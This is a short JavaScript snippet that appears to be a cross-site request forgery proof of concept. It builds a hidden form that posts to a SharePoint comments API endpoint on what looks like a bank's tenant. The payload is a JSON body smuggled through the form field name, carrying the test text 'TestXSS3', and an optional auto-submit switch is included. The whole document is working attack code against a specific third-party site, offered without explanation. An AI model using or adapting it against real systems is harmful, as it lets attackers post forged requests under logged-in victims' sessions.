(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
  const AUTO_SUBMIT = false;

  const form = document.createElement('form');
  form.method = 'POST';
  form.action = ACTION_URL;

  const hidden = document.createElement('input');
  hidden.type = 'hidden';
  hidden.name = '{"text":"TestXSS3","mentions":[]}';
  hidden.value = '';
  form.appendChild(hidden);

  const submit = document.createElement('input');
  submit.type = 'submit';
  submit.value = 'Submit Request';
  form.appendChild(submit);

  document.body.appendChild(form);

  if (AUTO_SUBMIT) {
    setTimeout(()=> {
      try { form.submit(); console.log('Form submitted to', ACTION_URL); }
      catch (e) { console.error('Submit failed:', e); }
    }, 50);
  } else {
    console.log('Form created. ACTION:', ACTION_URL);
  }
})();

